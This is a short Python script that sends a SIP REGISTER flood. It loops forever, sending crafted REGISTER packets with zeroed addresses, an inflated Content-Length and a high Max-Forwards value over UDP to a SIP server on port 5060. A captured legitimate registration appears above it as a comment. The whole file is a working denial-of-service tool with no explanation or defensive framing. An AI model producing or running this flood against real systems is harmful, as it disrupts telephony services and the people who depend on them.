#!/usr/bin/python3

import socket
import time

# register_string = """REGISTER sip:192.168.1.120 SIP/2.0
# CSeq: 5 REGISTER
# Via: SIP/2.0/UDP 192.168.1.108:5060;branch=z9hG4bK7af0a814-1a79-e811-9af7-0023573c9643;rport
# User-Agent: Ekiga/4.0.1
# From: <sip:005@192.168.1.120>;tag=76464c06-1a79-e811-9af7-0023573c9643
# Call-ID: e2434c06-1a79-e811-9af7-0023573c9643@Networkghost
# To: <sip:005@192.168.1.120>
# Contact: <sip:005@192.168.1.108:5060>
# Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING,PRACK
# Expires: 3600
# Content-Length: 0
# Max-Forwards: 70\n\r\n"""

register_string = """REGISTER sip:192.168.1.120 SIP/2.0
CSeq: 5 REGISTER
Via: SIP/2.0/UDP 000.000.000.000:5060;branch=dfhfghthdfhf-dfgfh-sdfds-hfhfhgf-rgawsfdfewfdd;rport
User-Agent: Ekiga/4.0.1
From: <sip:000@000.000.000.000>;tag=dfhfghthdfhf-dfgfh-sdfds-hfhfhgf-rgawsfdfewfdd
Call-ID: dfhfghthdfhf-dfgfh-sdfds-hfhfhgf-rgawsfdfewfdd
To: <sip:000@000.000.000.000>
Contact: <sip:000@000.000.000.000:5060>
Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING,PRACK
Expires: 3600
Content-Length: 1450
Max-Forwards: 250\n\r\n"""

dst_hostname = "192.168.1.120"
dst_port = 5060

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP

print("Starting sip register flood with a package size of {}".format(len(register_string)))

while True:
    sock.sendto(bytes(register_string, "utf-8"), (dst_hostname, dst_port))